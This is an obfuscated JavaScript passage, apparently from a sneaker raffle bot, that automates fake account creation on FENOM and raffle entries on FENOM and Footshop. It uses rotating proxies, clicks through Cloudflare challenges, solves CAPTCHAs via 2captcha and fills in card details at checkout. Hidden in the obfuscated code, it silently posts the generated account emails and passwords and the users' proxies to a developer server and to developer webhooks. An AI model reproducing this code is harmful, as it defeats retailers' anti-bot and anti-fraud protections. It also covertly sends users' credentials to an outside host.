                                    return;
                                }
                                try {
                                    _0x321b29 = await _0x23e690['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x3281b2[0x0] + ':' + _0x3281b2[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                } catch {
                                    _0x321b29 = await _0x23e690['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x3281b2[0x0] + ':' + _0x3281b2[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                }
                                const _0x56ee13 = await _0x321b29['newPage']();
                                await _0x56ee13['setViewport']({
                                    'width': 0x500 + _0x120d6e(0x1, 0x32),
                                    'height': 0x2d9 + _0x120d6e(0x1, 0x32)
                                });
                                const _0x297987 = await _0x56ee13['target']()['createCDPSession'](), { windowId: _0x51fcba } = await _0x297987['send']('Browser.getWindowForTarget');
                                await _0x56ee13['authenticate']({
                                    'username': '' + _0x3281b2[0x2],
                                    'password': '' + _0x3281b2[0x3]
                                }), console['log'](_0x82e5a5() + '\x20[' + _0x46a91c['name'] + ']\x20Task\x20' + (_0x515cdb + 0x1) + '\x20:\x20Getting\x20Session'), await _0x56ee13['goto']('' + _0xada6ec, { 'waitUntil': 'networkidle2' }), console['log'](_0x82e5a5() + '\x20[' + _0x46a91c['name'] + ']\x20Task\x20' + (_0x515cdb + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x41ed31(0x1388);
                                var _0x396a25 = await _0x56ee13['$']('.hcaptcha-box');
                                if (_0x396a25) {
                                    console['log'](_0x82e5a5() + '\x20[' + _0x46a91c['name'] + ']\x20Task\x20' + (_0x515cdb + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x41ed31(0x2710);
                                    const _0x49d242 = await _0x56ee13['$']('.hcaptcha-box');
                                    if (_0x49d242)
                                        try {
                                            await _0x49d242['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                    try {
                                        await _0x56ee13['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                    } catch {
                                        var _0x40d0b0 = await _0x56ee13['$']('.hcaptcha-box');
                                        if (_0x40d0b0)
                                            try {
                                                await _0x40d0b0['click']();
                                            } catch {
                                                throw new Error('Empty\x20Turnstile\x20Challenge');
                                            }
                                    }
                                }
                                try {
                                    await _0x56ee13['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x1d4c0 }), await _0x297987['send']('Browser.setWindowBounds', {
                                        'windowId': _0x51fcba,
                                        'bounds': { 'windowState': 'minimized' }
                                    }), await _0x41ed31(0xfa0);
                                } catch {
                                    throw new Error('Blocked\x20by\x20cloudflare');
                                }
                                console['log'](_0x82e5a5() + '\x20[' + _0x46a91c['name'] + ']\x20Task\x20' + (_0x515cdb + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x56ee13['type']('input[name=\x22firstname\x22]', '' + _0x5da702[_0x515cdb]['FirstName']), await _0x41ed31(0x1f4), await _0x56ee13['type']('input[name=\x22lastname\x22]', '' + _0x5da702[_0x515cdb]['LastName']), await _0x41ed31(0x1f4), await _0x56ee13['type']('input[name=\x22email\x22]', '' + _0x5da702[_0x515cdb]['Email']), await _0x41ed31(0x1f4), await _0x56ee13['type']('input[name=\x22password\x22]', '' + _0x5da702[_0x515cdb]['Password']), await _0x41ed31(0x258), await _0x56ee13['$eval']('input[name=\x22psgdpr\x22]', _0x2363de => _0x2363de['click']()), await _0x41ed31(0x1f4), console['log'](_0x82e5a5() + '\x20[' + _0x46a91c['name'] + ']\x20Task\x20' + (_0x515cdb + 0x1) + '\x20:\x20Sending\x20Request'), await _0x56ee13['$eval']('#customer-form', _0x2322a4 => _0x2322a4['submit']());
                                try {
                                    try {
                                        await _0x56ee13['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 });
                                    } catch {
                                        throw new Error('Succes-response\x20not\x20found');
                                    }
                                    _0x8f6848 = 'no', console['log'](_0x3dfcf2['green'](_0x82e5a5() + '\x20[' + _0x46a91c['name'] + ']\x20Task\x20' + (_0x515cdb + 0x1) + '\x20:\x20Account\x20' + _0x5da702[_0x515cdb]['Email'] + '\x20Generated')), _0x223df9['appendFileSync']('../accounts/fenom.csv', '\x0a' + _0x5da702[_0x515cdb]['Email'] + ',' + _0x5da702[_0x515cdb]['Password']);
                                    let _0x2fa540 = _0x5da702[_0x515cdb];
                                    try {
                                        prxdata = {
                                            'username': _0x128b96['replace']('#', ''),
                                            'module': _0x46a91c['name'],
                                            'entrydata': JSON['stringify'](_0x2fa540),
                                            'proxy': '' + _0x29251e[_0x515cdb]
                                        };
                                        var _0x4648c2 = JSON['stringify'](prxdata);
                                        let _0x4dc0eb = { 'headers': { 'content-type': 'application/json' } };
                                        await _0x48af5a['post']('https://jraffles.herokuapp.com/success', _0x4648c2, _0x4dc0eb);
                                    } catch (_0x56b785) {
                                    }
                                    try {
                                        _0x4ae33b['webhook'] != undefined && _0x4ae33b['webhook'] != '' && await _0x48936e(_0x4ae33b['webhook'], _0x4c5639['succesDEVMSG']);
                                    } catch {
                                    }
                                    await _0x48936e(_0x1041df, _0x4c5639['succesDEVMSG']);
                                } catch (_0x45f7ef) {
                                    throw new Error('Account\x20generation\x20failed');
                                }
                            } catch (_0x2892e4) {
                                console['log'](_0x3dfcf2['red'](_0x82e5a5() + '\x20[' + _0x46a91c['name'] + ']\x20Task\x20' + (_0x515cdb + 0x1) + '\x20:\x20' + _0x2892e4)), _0x28571f = '' + _0x2892e4;
                                var _0x1b8102 = await _0x559dec(_0x5da702[_0x515cdb], _0x46a91c, 'acc', !![], _0x28571f);
                                _0x4c5639['errorDEV'] = { 'embeds': [_0x1b8102] }, _0x4ae33b['webhook'] != undefined && _0x4ae33b['webhook'] != '' && await _0x48936e(_0x4ae33b['webhook'], _0x4c5639['errorDEV']), await _0x48936e(_0x36657d, _0x4c5639['errorDEV']), _0x8f6848 = 'yes';
                            } finally {
                                _0x321b29 && _0x321b29['close']();
                                if (_0x8f6848 == 'yes' && _0x309608 != 0x5)
                                    return console['log'](_0x3dfcf2['red'](_0x82e5a5() + '\x20[' + _0x46a91c['name'] + ']\x20Task\x20' + (_0x515cdb + 0x1) + '\x20:\x20Retrying\x20(' + _0x309608 + '\x20/\x205)')), _0x309608 = _0x309608 + 0x1, _0x3c085e--, _0x2b6c1a(_0x46a91c, _0x5da702, _0x29251e, _0x515cdb, _0x309608);
                                _0x8f6848 == 'yes' && _0x309608 >= 0x5 && _0x2504ad(_0x5da702[_0x515cdb], _0x46a91c), !_0x1c3485 && (console['log'](_0x82e5a5() + '\x20[' + _0x46a91c['name'] + ']\x20Waiting\x20for\x20' + _0x4ae33b['delay'] + '\x20ms'), await _0x41ed31(_0x4ae33b['delay'])), _0x3c085e--;
                            }
                        }
                        _0x2b6c1a(_0x1108ca, _0x4270ca, _0x5efe42, _0x37f59b), !_0x1c3485 && await _0x41ed31(0x15e);
                    }
                }
            },
            {
                'name': 'FENOM\x20Raffle\x20Entries',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function _0x4fccb6(_0x1131a2, _0x459948, _0xae618a) {
                    _0x23e690['use'](_0x57a02e()), _0x23e690['use'](_0x2aeb7e({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x4ae33b['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x935c84 = 0x0; _0x935c84 < _0x459948['length']; _0x935c84++) {
                        if (_0x3cdad9 != 'yes')
                            var _0x3cdad9 = '', _0x32dc6f = 0x0;
                        var _0x170734;
                        try {
                            await _0x101e1b(_0x459948, _0x935c84);
                        } catch {
                            _0x3cdad9 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x445891(_0x1131a2['name'] + '\x20Task\x20' + (_0x935c84 + 0x1) + '\x20/\x20' + _0x459948['length'] + '\x20||\x20File:\x20' + _0x4d7b48 + '\x20Proxies:\x20' + _0x2bc9a5);
                        const _0x1dfb12 = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x15d661 = Math['round'](Math['random']() * (_0xae618a['length'] - 0x1)), _0x4abada = _0xae618a[_0x15d661]['split'](':'), _0x5ae5bd;
                        try {
                            _0x5ae5bd = await _0x23e690['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x4abada[0x0] + ':' + _0x4abada[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x5ae5bd = await _0x23e690['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x4abada[0x0] + ':' + _0x4abada[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x26f2f4 = await _0x5ae5bd['newPage'](), _0x54ebaa = await _0x26f2f4['target']()['createCDPSession'](), { windowId: _0x22d0b2 } = await _0x54ebaa['send']('Browser.getWindowForTarget');
                            await _0x26f2f4['authenticate']({
                                'username': '' + _0x4abada[0x2],
                                'password': '' + _0x4abada[0x3]
                            }), console['log'](_0x82e5a5() + '\x20[' + _0x1131a2['name'] + ']\x20Task\x20' + (_0x935c84 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x26f2f4['goto']('https://www.fenom.com/en/authentication', { 'waitUntil': 'networkidle2' }), console['log'](_0x82e5a5() + '\x20[' + _0x1131a2['name'] + ']\x20Task\x20' + (_0x935c84 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x41ed31(0x1388);
                            var _0x1466c5 = await _0x26f2f4['$']('.hcaptcha-box');
                            if (_0x1466c5) {
                                console['log'](_0x82e5a5() + '\x20[' + _0x1131a2['name'] + ']\x20Task\x20' + (_0x935c84 + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x41ed31(0x2710);
                                const _0xf1ca40 = await _0x26f2f4['$']('.hcaptcha-box');
                                if (_0xf1ca40)
                                    try {
                                        await _0xf1ca40['click']();
                                    } catch {
                                        throw new Error('Empty\x20Turnstile\x20Challenge');
                                    }
                                try {
                                    await _0x26f2f4['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                } catch {
                                    var _0x984966 = await _0x26f2f4['$']('.hcaptcha-box');
                                    if (_0x984966)
                                        try {
                                            await _0x984966['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                }
                            }
                            await _0x54ebaa['send']('Browser.setWindowBounds', {
                                'windowId': _0x22d0b2,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0x41ed31(0x1f40);
                            try {
                                await _0x26f2f4['waitForSelector']('input[name=\x22email\x22]', { 'timeout': 0x1d4c0 });
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            await _0x41ed31(0x1388), console['log'](_0x82e5a5() + '\x20[' + _0x1131a2['name'] + ']\x20Task\x20' + (_0x935c84 + 0x1) + '\x20:\x20Logging\x20in'), await _0x26f2f4['type']('input[name=\x22email\x22]', '' + _0x459948[_0x935c84]['Email']), await _0x41ed31(0x1f4), await _0x26f2f4['type']('input[name=\x22password\x22]', '' + _0x459948[_0x935c84]['Password']), await _0x41ed31(0x258), await _0x26f2f4['$eval']('#login-form', _0x4c2e32 => _0x4c2e32['submit']()), await _0x26f2f4['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), await _0x41ed31(0x1f4), await _0x26f2f4['goto']('' + _0x459948[_0x935c84]['Url']), await _0x26f2f4['waitForSelector']('.prod-variant\x20>\x20ul\x20>\x20li'), console['log'](_0x82e5a5() + '\x20[' + _0x1131a2['name'] + ']\x20Task\x20' + (_0x935c84 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x459948[_0x935c84]['Size']);
                            if (_0x459948[_0x935c84]['Size'] != 'RANDOM') {
                                var _0x48c29c = '\x20' + _0x459948[_0x935c84]['Size'] + '\x20';
                                const _0x202270 = await _0x26f2f4['$x']('//span[contains(text(),\x20' + _0x48c29c + ')]');
                                await _0x202270[0x0]['click']();
                            } else {
                                const _0x4b69c8 = await _0x26f2f4['$$']('.prod-variant\x20>\x20ul\x20>\x20li');
                                var _0x58adcf = Math['round'](Math['random']() * (_0x4b69c8['length'] - 0x1));
                                await _0x4b69c8[_0x58adcf]['click']();
                            }
                            await _0x41ed31(0x258), await _0x26f2f4['click']('#cookieChoiceDismiss'), await _0x41ed31(0x3e8), await _0x26f2f4['type']('#instagram-account', '' + _0x459948[_0x935c84]['Follower']), await _0x41ed31(0x28a), await _0x26f2f4['click']('#book-btn'), await _0x41ed31(0xbb8);
                            try {
                                await _0x26f2f4['waitForSelector']('#recaptcha-container\x20>\x20div\x20>\x20div\x20>\x20iframe');
                            } catch {
                                throw new Error('Captcha\x20not\x20found');
                            }
                            await _0x41ed31(0x1f4), console['log'](_0x82e5a5() + '\x20[' + _0x1131a2['name'] + ']\x20Task\x20' + (_0x935c84 + 0x1) + '\x20:\x20' + _0x3dfcf2['cyan']('Solving\x20Captcha')), await _0x26f2f4['solveRecaptchas'](), console['log'](_0x82e5a5() + '\x20[' + _0x1131a2['name'] + ']\x20Task\x20' + (_0x935c84 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x41ed31(0x7d0), await _0x26f2f4['$eval']('#book-btn-for-sure', _0x4b89d7 => _0x4b89d7['click']()), await _0x41ed31(0x12c), await _0x26f2f4['click']('#book-btn-for-sure'), await _0x41ed31(0xdac);
                            const _0xc33245 = await _0x26f2f4['$eval']('.reservation-popup\x20>\x20.title', _0x43c00b => {
                                return _0x43c00b['innerHTML'];
                            });
                            if (_0xc33245) {
                                _0x3cdad9 = 'no', _0x13e83d(_0x459948[_0x935c84], _0x1131a2), console['log'](_0x3dfcf2['green'](_0x82e5a5() + '\x20[' + _0x1131a2['name'] + ']\x20Task\x20' + (_0x935c84 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                var _0x2c23bd = await _0x559dec(_0x459948[_0x935c84], _0x1131a2, 'dev', ![]), _0x4c688a = await _0x559dec(_0x459948[_0x935c84], _0x1131a2, 'pub', ![]);
                                let _0x181499 = _0x459948[_0x935c84];
                                try {
                                    prxdata = {
                                        'username': _0x128b96['replace']('#', ''),
                                        'module': _0x1131a2['name'],
                                        'entrydata': JSON['stringify'](_0x181499),
                                        'proxy': '' + _0xae618a[_0x935c84]
                                    };
                                    var _0x9b3813 = JSON['stringify'](prxdata);
                                    let _0x2441fa = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x48af5a['post']('https://jraffles.herokuapp.com/success', _0x9b3813, _0x2441fa);
                                } catch (_0x2a918c) {
                                }
                                const _0x12fac8 = {
                                    'succesDEVMSG': { 'embeds': [_0x2c23bd] },
                                    'succesPUBMSG': { 'embeds': [_0x4c688a] }
                                };
                                try {
                                    _0x4ae33b['webhook'] != undefined && _0x4ae33b['webhook'] != '' && await _0x48936e(_0x4ae33b['webhook'], _0x12fac8['succesDEVMSG']), await _0x41ed31(0xc8), await _0x48936e(_0x3a625c, _0x12fac8['succesDEVMSG']), await _0x41ed31(0xc8), await _0x48936e(_0x22a07c, _0x12fac8['succesPUBMSG']);
                                } catch (_0x5770bb) {
                                    console['log'](_0x3dfcf2['yellow'](_0x82e5a5() + '\x20[' + _0x1131a2['name'] + ']\x20Task\x20' + (_0x935c84 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x5770bb));
                                }
                            } else
                                throw new Error('Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.');
                        } catch (_0x2c4447) {
                            console['log'](_0x3dfcf2['red'](_0x82e5a5() + '\x20[' + _0x1131a2['name'] + ']\x20Task\x20' + (_0x935c84 + 0x1) + '\x20:\x20' + _0x2c4447)), _0x170734 = '' + _0x2c4447;
                            var _0x3e1dbc = await _0x559dec(_0x459948[_0x935c84], _0x1131a2, 'dev', !![], _0x170734), _0x2c23bd = await _0x559dec(_0x459948[_0x935c84], _0x1131a2, 'dev', ![]), _0x4c688a = await _0x559dec(_0x459948[_0x935c84], _0x1131a2, 'pub', ![]);
                            const _0x3da1d1 = {
                                'succesDEVMSG': { 'embeds': [_0x2c23bd] },
                                'succesPUBMSG': { 'embeds': [_0x4c688a] }
                            };
                            _0x3da1d1['errorDEV'] = { 'embeds': [_0x3e1dbc] }, _0x4ae33b['webhook'] != undefined && _0x4ae33b['webhook'] != '' && await _0x48936e(_0x4ae33b['webhook'], _0x3da1d1['errorDEV']), await _0x48936e(_0x36657d, _0x3da1d1['errorDEV']), _0x2c4447 != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x3cdad9 = 'yes');
                        } finally {
                            _0x5ae5bd['close']();
                            if (_0x3cdad9 == 'yes' && _0x32dc6f != 0x5 && _0x170734 != 'Size\x20Not\x20Found') {
                                console['log'](_0x3dfcf2['red'](_0x82e5a5() + '\x20[' + _0x1131a2['name'] + ']\x20Task\x20' + (_0x935c84 + 0x1) + '\x20:\x20Retrying\x20(' + _0x32dc6f + '\x20/\x205)')), _0x935c84 = _0x935c84 - 0x1, _0x32dc6f = _0x32dc6f + 0x1;
                                continue;
                            }
                            _0x3cdad9 == 'yes' && _0x32dc6f >= 0x5 && (_0x2504ad(_0x459948[_0x935c84], _0x1131a2), _0x3cdad9 = 'no', _0x32dc6f = 0x0), console['log'](_0x82e5a5() + '\x20[' + _0x1131a2['name'] + ']\x20Waiting\x20for\x20' + _0x4ae33b['delay'] + '\x20ms'), await _0x41ed31(_0x4ae33b['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'FOOTSHOP',
        'modules': [{
            'name': 'FOOTSHOP\x20Raffle\x20Entries',
            'store': 'Footshop',
            'logo': 'https://images.easyfundraising.org.uk/retailer/cropped/logo-footshop-1615542072.png',
            'function': async function (_0x128f76, _0x378bdc, _0x208168) {
                _0x23e690['use'](_0x57a02e()), _0x23e690['use'](_0x2aeb7e({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x4ae33b['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x40d642 = 0x0; _0x40d642 < _0x378bdc['length']; _0x40d642++) {
                    var _0x1fc35b;
                    if (_0x572561 != 'yes')
                        var _0x572561 = '', _0x128fbb = 0x0;
                    var _0x43eceb = [{
                        'type': 'rich',
                        'title': 'Succesful\x20Footshop\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'User',
                                'value': '' + _0x128b96
                            },
                            {
                                'name': 'Product',
                                'value': '' + _0x378bdc[_0x40d642]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x378bdc[_0x40d642]['Size']
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x4ae33b['footshopDelay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x8a26c5
                            }
                        ]
                    }], _0x141af0 = await _0x559dec(_0x378bdc[_0x40d642], _0x128f76, 'dev', ![]), _0x31c706 = await _0x559dec(_0x378bdc[_0x40d642], _0x128f76, 'pub', ![]);
                    const _0x2e5688 = {
                        'succesDEVMSG': { 'embeds': [_0x141af0] },
                        'succesPUBMSG': { 'embeds': [_0x31c706] }
                    }, _0x2c0eed = { 'embeds': _0x43eceb };
                    try {
                        await _0x101e1b(_0x378bdc, _0x40d642);
                    } catch {
                        _0x572561 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    if (_0x378bdc[_0x40d642]['Email'] == '' || _0x378bdc[_0x40d642]['FirstName'] == '' || _0x378bdc[_0x40d642]['LastName'] == '' || _0x378bdc[_0x40d642]['Country'] == '' || _0x378bdc[_0x40d642]['Size'] == '' || _0x378bdc[_0x40d642]['Address1'] == '' || _0x378bdc[_0x40d642]['Zip'] == '') {
                        console['log'](_0x82e5a5() + '\x20[' + _0x128f76['name'] + ']\x20Task\x20' + (_0x40d642 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x378bdc[_0x40d642]['Email'] == '' || _0x378bdc[_0x40d642]['FirstName'] == '' || _0x378bdc[_0x40d642]['LastName'] == '' || _0x378bdc[_0x40d642]['Country'] == '' || _0x378bdc[_0x40d642]['Size'] == '' || _0x378bdc[_0x40d642]['Address1'] == '' || _0x378bdc[_0x40d642]['Zip'] == '' || _0x378bdc[_0x40d642]['Phone'] == '') {
                        console['log'](_0x82e5a5() + '\x20[' + _0x128f76['name'] + ']\x20Task\x20' + (_0x40d642 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    const _0x4fa045 = '' + _0x378bdc[_0x40d642]['Url'];
                    if (_0x4ae33b['useRandomProxy'] = ![])
                        var _0x1d7a87 = _0x208168[_0x40d642]['split'](':');
                    else
                        var _0x3f0ef5 = Math['round'](Math['random']() * (_0x208168['length'] - 0x1)), _0x1d7a87 = _0x208168[_0x3f0ef5]['split'](':');
                    var _0x4ebb31;
                    try {
                        _0x4ebb31 = await _0x23e690['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x1d7a87[0x0] + ':' + _0x1d7a87[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x4ebb31 = await _0x23e690['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x1d7a87[0x0] + ':' + _0x1d7a87[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0x30ac64 = await _0x4ebb31['newPage']();
                        await _0x30ac64['authenticate']({
                            'username': '' + _0x1d7a87[0x2],
                            'password': '' + _0x1d7a87[0x3]
                        }), console['log'](_0x82e5a5() + '\x20[' + _0x128f76['name'] + ']\x20Task\x20' + (_0x40d642 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x30ac64['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x30ac64['setRequestInterception'](!![]), _0x30ac64['on']('request', _0x49e3bf => {
                            _0x49e3bf['resourceType']() === 'image' || _0x49e3bf['resourceType']() === 'font' || _0x49e3bf['resourceType']() === 'media' ? _0x49e3bf['abort']() : _0x49e3bf['continue']();
                        });
                        try {
                            await _0x30ac64['goto'](_0x4fa045), await _0x41ed31(0xbb8), await _0x30ac64['waitForSelector']('.control__JhutY');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x30ac64['click']('.control__JhutY'), await _0x41ed31(0x1f4);
                        if (_0x378bdc[_0x40d642]['Size'] != 'RANDOM')
                            try {
                                const _0x4134e0 = await _0x30ac64['$x']('//div[contains(text(),\x20\x27' + _0x378bdc[_0x40d642]['Size'] + '\x27)]');
                                await _0x4134e0[0x0]['click']();
                            } catch {
                                console['log'](_0x3dfcf2['red'](_0x82e5a5() + '\x20[' + _0x128f76['name'] + ']\x20Task\x20' + (_0x40d642 + 0x1) + '\x20:\x20Size\x20Not\x20Found'));
                                continue;
                            }
                        else {
                            const _0x48bd23 = await _0x30ac64['$$']('.options__3UQpT\x20>\x20div.row');
                            var _0x260f82 = Math['round'](Math['random']() * (_0x48bd23['length'] - 0x1));
                            await _0x48bd23[_0x260f82]['click']();
                        }
                        await _0x41ed31(0x4b0);
                        const _0x10d7ac = await _0x30ac64['$x']('//span[contains(text(),\x20\x27Enter\x20raffle\x20now\x27)]');
                        await _0x10d7ac[0x0]['click'](), await _0x30ac64['waitForSelector']('input[name=\x22email\x22]'), console['log'](_0x82e5a5() + '\x20[' + _0x128f76['name'] + ']\x20Task\x20' + (_0x40d642 + 0x1) + '\x20:\x20Filling\x20Entry\x20Credentials'), await _0x30ac64['type']('input[name=\x22email\x22]', '' + _0x378bdc[_0x40d642]['Email']), await _0x41ed31(0x640), await _0x30ac64['type']('input[name=\x22phone\x22]', '' + _0x378bdc[_0x40d642]['Phone']), await _0x41ed31(0x4b0), await _0x30ac64['click']('button.btn.continue-button__1RtsS'), await _0x41ed31(0x4b0);
                        try {
                            await _0x30ac64['type']('input[name=\x22firstName\x22]', '' + _0x378bdc[_0x40d642]['FirstName']), await _0x41ed31(0x258);
                        } catch {
                            const _0x2c952d = await _0x30ac64['$$eval']('.invalid-feedback\x20>\x20div', _0x1b5874 => {
                                return _0x1b5874['map'](_0x5bece8 => _0x5bece8['innerText']);
                            });
                            console['log'](_0x3dfcf2['red'](_0x82e5a5() + '\x20[' + _0x128f76['name'] + ']\x20Task\x20' + (_0x40d642 + 0x1) + '\x20:\x20' + _0x2c952d));
                            continue;
                        }
                        await _0x30ac64['type']('input[name=\x22lastName\x22]', '' + _0x378bdc[_0x40d642]['LastName']), await _0x41ed31(0xc8), await _0x30ac64['type']('input[name=\x22instagramUsername\x22]', '' + _0x378bdc[_0x40d642]['Follower']), await _0x41ed31(0x4b0), await _0x30ac64['click']('button.btn.continue-button__1RtsS'), await _0x41ed31(0x3e8), console['log'](_0x82e5a5() + '\x20[' + _0x128f76['name'] + ']\x20Task\x20' + (_0x40d642 + 0x1) + '\x20:\x20Filling\x20Shipping'), await _0x30ac64['select']('select[name=\x22country\x22]', '' + _0x378bdc[_0x40d642]['Country']), await _0x41ed31(0x2bc), await _0x30ac64['type']('input[name=\x22streetName\x22]', '' + _0x378bdc[_0x40d642]['Address1']), await _0x41ed31(0x258), await _0x30ac64['type']('input[name=\x22houseNumber\x22]', _0x378bdc[_0x40d642]['HouseNumber'] + '\x20' + _0x378bdc[_0x40d642]['Address2']), await _0x41ed31(0xc8), await _0x30ac64['type']('input[name=\x22postalCode\x22]', '' + _0x378bdc[_0x40d642]['Zip']), await _0x41ed31(0x1f4), await _0x30ac64['type']('input[name=\x22city\x22]', '' + _0x378bdc[_0x40d642]['City']), await _0x41ed31(0x4b0), await _0x30ac64['click']('input[name=\x22consent::privacy-policy-101\x22]'), await _0x41ed31(0x4b0), await _0x30ac64['click']('button.btn.continue-button__1RtsS'), await _0x41ed31(0x4b0), console['log'](_0x82e5a5() + '\x20[' + _0x128f76['name'] + ']\x20Task\x20' + (_0x40d642 + 0x1) + '\x20:\x20Solving\x20hCaptcha'), await _0x30ac64['solveRecaptchas'](), console['log'](_0x82e5a5() + '\x20[' + _0x128f76['name'] + ']\x20Task\x20' + (_0x40d642 + 0x1) + '\x20:\x20hCaptcha\x20solved'), await _0x41ed31(0xbb8), await _0x30ac64['click']('button.btn.continue-button__1RtsS'), await _0x41ed31(0x1388), console['log'](_0x82e5a5() + '\x20[' + _0x128f76['name'] + ']\x20Task\x20' + (_0x40d642 + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x30ac64['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x30ac64['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x41ed31(0x4b0), await _0x30ac64['type']('span[data-cse=\x22encryptedCardNumber\x22]', '' + _0x378bdc[_0x40d642]['CardNumber']), await _0x41ed31(0x320), await _0x30ac64['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x30ac64['type']('span[data-cse=\x22encryptedExpiryDate\x22]', '' + _0x378bdc[_0x40d642]['ExpiryDate']), await _0x41ed31(0x4b0), await _0x30ac64['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x30ac64['type']('span[data-cse=\x22encryptedSecurityCode\x22]', '' + _0x378bdc[_0x40d642]['CVV']), await _0x41ed31(0x226), await _0x30ac64['type']('input[name=\x22holderName\x22]', '' + _0x378bdc[_0x40d642]['NameOnCard']), await _0x41ed31(0x226), await _0x30ac64['click']('button.adyen-checkout__button'), console['log'](_0x82e5a5() + '\x20[' + _0x128f76['name'] + ']\x20Task\x20' + (_0x40d642 + 0x1) + '\x20:\x20Awaiting\x203DS');
                        try {
                            await _0x30ac64['waitForSelector']('.thank-you__1AwOo', { 'timeout': 0x493e0 }), await _0x41ed31(0xbb8);
                        } catch (_0x40498d) {
                            console['log'](_0x3dfcf2['red'](_0x82e5a5() + '\x20[' + _0x128f76['name'] + ']\x20Task\x20' + (_0x40d642 + 0x1) + '\x20:\x203DS\x20Failed')), _0x1fc35b = '3DS\x20Error\x20' + _0x40498d;
                            var _0x4e96c9 = await _0x559dec(_0x378bdc[_0x40d642], _0x128f76, 'dev', !![], _0x1fc35b);
                            _0x2e5688['errorDEV'] = { 'embeds': [_0x4e96c9] };
                            _0x4ae33b['webhook'] != undefined && _0x4ae33b['webhook'] != '' && await _0x48936e(_0x4ae33b['webhook'], _0x2e5688['errorDEV']);
                            await _0x48936e(_0x36657d, _0x2e5688['errorDEV']);
                            continue;
                        }
